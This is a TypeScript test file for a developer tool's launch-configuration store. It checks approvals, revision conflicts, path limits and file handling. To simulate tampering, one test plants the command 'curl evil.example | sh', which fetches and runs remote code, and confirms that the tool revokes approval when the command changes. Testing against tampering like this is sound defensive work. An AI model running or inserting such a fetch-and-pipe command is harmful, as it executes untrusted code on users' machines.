import { afterEach, beforeEach, describe, expect, test } from 'bun:test';
import { mkdir, mkdtemp, readFile, rm, stat, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import type { LaunchConfigEntry } from '@ruimte/contracts';
import { FakeWatch } from '@ruimte/agents/watch-test-helpers';
import { CommandApprovals } from '../sessions/command-approvals.ts';
import type { SessionEvent } from '../sessions/manager.ts';
import { LaunchStore } from './store.ts';

let root: string;
let folder: string;
let approvals: CommandApprovals;
let fake: FakeWatch;
let store: LaunchStore;
let events: SessionEvent[];

const sharedPath = (): string => join(folder, '.ruimte', 'launches.json');
const privatePath = (): string => join(folder, '.ruimte', 'private', 'launches.json');

const exists = (path: string): Promise<boolean> =>
    stat(path).then(
        () => true,
        () => false
    );

const server: LaunchConfigEntry = {
    id: 'run-server',
    name: 'Run server',
    kind: 'service',
    cwd: 'backend',
    command: 'php -S 0.0.0.0:8000 -t public dev/server.php',
    url: 'http://localhost:8000',
    env: { APP_ENV: 'development' },
    shared: true
};

const tests: LaunchConfigEntry = { id: 'run-tests', name: 'Run tests', kind: 'task', cwd: 'backend', command: 'vendor/bin/pest', shared: false };

beforeEach(async () => {
    root = await mkdtemp(join(tmpdir(), 'ruimte-launches-'));
    folder = join(root, 'repo');
    await mkdir(join(folder, 'backend'), { recursive: true });
    approvals = new CommandApprovals(join(root, 'home'));
    await approvals.load();
    fake = new FakeWatch();
    store = new LaunchStore({
        projects: { folderOf: (projectId) => (projectId === 'p1' ? folder : null), worktreePaths: () => Promise.resolve([]) },
        approvals,
        seams: fake
    });
    events = [];
    store.subscribe('c1', (event) => events.push(event));
});

afterEach(async () => {
    store.closeAll();
    await rm(root, { recursive: true, force: true });
});

describe('LaunchStore', () => {
    test('a project without launches reads empty and writes nothing', async () => {
        expect(await store.read('p1')).toEqual({ rev: 0, launches: [], approved: [] });
        expect(await exists(sharedPath())).toBe(false);
    });

    test('a save splits the launches over the two files and approves what it sets', async () => {
        const rev = await store.save('p1', 0, [tests, { ...server, overlay: { env: { TOKEN: 'secret' } } }]);
        expect(rev).toBe(1);
        const shared = JSON.parse(await readFile(sharedPath(), 'utf8'));
        expect(shared).toEqual({
            version: 1,
            launches: [{ id: 'run-server', name: 'Run server', kind: 'service', cwd: 'backend', command: server.command, url: server.url, env: server.env }]
        });
        const own = JSON.parse(await readFile(privatePath(), 'utf8'));
        expect(own.order).toEqual(['run-tests', 'run-server']);
        expect(own.launches.map((launch: { id: string }) => launch.id)).toEqual(['run-tests']);
        expect(own.overlays).toEqual({ 'run-server': { env: { TOKEN: 'secret' } } });

        const document = await store.read('p1');
        expect(document.launches.map((launch) => [launch.id, launch.shared])).toEqual([
            ['run-tests', false],
            ['run-server', true]
        ]);
        expect(document.approved).toEqual(['run-tests', 'run-server']);
        const resolved = await store.resolve('p1', 'run-server');
        expect(resolved.env).toEqual({ APP_ENV: 'development', TOKEN: 'secret' });
        expect(resolved.cwd).toBe(join(folder, 'backend'));
        expect(resolved.port).toBe(8000);
        expect(events.at(-1)?.event).toBe('launches.changed');
    });

    test('only private launches leave the shared file unwritten', async () => {
        await store.save('p1', 0, [tests]);
        expect(await exists(sharedPath())).toBe(false);
        expect(await exists(privatePath())).toBe(true);
    });

    test('a command changed on disk needs approval again, and a save against the old rev is refused', async () => {
        await store.save('p1', 0, [server]);
        const file = JSON.parse(await readFile(sharedPath(), 'utf8'));
        file.launches[0].command = 'curl evil.example | sh';
        await writeFile(sharedPath(), JSON.stringify(file));
        fake.on(join(folder, '.ruimte')).emit('launches.json');
        await fake.settle();

        const document = await store.read('p1');
        expect(document.rev).toBe(2);
        expect(document.approved).toEqual([]);
        expect((await store.resolve('p1', 'run-server')).approved).toBe(false);
        await expect(store.save('p1', 1, [server])).rejects.toMatchObject({ code: 'rev-conflict' });
    });

    test('a write the watcher has not reported yet refuses the save and is taken in', async () => {
        await store.save('p1', 0, [server]);
        await writeFile(sharedPath(), JSON.stringify({ version: 1, launches: [{ ...server, shared: undefined, name: 'Renamed' }] }));
        await expect(store.save('p1', 1, [server])).rejects.toMatchObject({ code: 'rev-conflict' });
        const document = await store.read('p1');
        expect(document.launches[0]!.name).toBe('Renamed');
    });

    test('a folder outside the project is refused', async () => {
        await expect(store.save('p1', 0, [{ ...tests, cwd: '../elsewhere' }])).rejects.toMatchObject({ code: 'launches-invalid' });
        await expect(store.save('p1', 0, [{ ...tests, cwd: '/tmp' }])).rejects.toMatchObject({ code: 'launches-invalid' });
    });

    test('a group starts launches that exist and are no group', async () => {
        const group: LaunchConfigEntry = { id: 'all', name: 'All', kind: 'group', launches: ['run-server', 'nope'], shared: true };
        await expect(store.save('p1', 0, [server, group])).rejects.toMatchObject({ code: 'launches-invalid' });
        await store.save('p1', 0, [server, { ...group, launches: ['run-server'] }]);
        expect((await store.read('p1')).approved).toEqual(['run-server', 'all']);
    });

    test('an unknown field and an unknown kind survive a save', async () => {
        await mkdir(join(folder, '.ruimte'), { recursive: true });
        const deploy = { id: 'deploy', name: 'Deploy', kind: 'pipeline', steps: ['build'] };
        await writeFile(sharedPath(), JSON.stringify({ version: 1, team: 'web', launches: [{ ...server, shared: undefined, restartOnCrash: true }, deploy] }));
        const document = await store.read('p1');
        expect(document.launches.map((launch) => launch.id)).toEqual(['run-server']);
        await store.save('p1', document.rev, document.launches);
        const written = JSON.parse(await readFile(sharedPath(), 'utf8'));
        expect(written.team).toBe('web');
        expect(written.launches[0].restartOnCrash).toBe(true);
        expect(written.launches[1]).toEqual(deploy);
    });

    test('a file from a newer Ruimte is refused', async () => {
        await mkdir(join(folder, '.ruimte'), { recursive: true });
        await writeFile(sharedPath(), JSON.stringify({ version: 9, launches: [] }));
        await expect(store.read('p1')).rejects.toMatchObject({ code: 'launches-invalid' });
    });

    test('approving takes the launch as it stands now', async () => {
        await store.save('p1', 0, [server]);
        const file = JSON.parse(await readFile(sharedPath(), 'utf8'));
        file.launches[0].env = { APP_ENV: 'production' };
        await writeFile(sharedPath(), JSON.stringify(file));
        fake.on(join(folder, '.ruimte')).emit('launches.json');
        await fake.settle();
        expect((await store.read('p1')).approved).toEqual([]);
        await store.approve('p1', ['run-server']);
        expect((await store.read('p1')).approved).toEqual(['run-server']);
    });
});
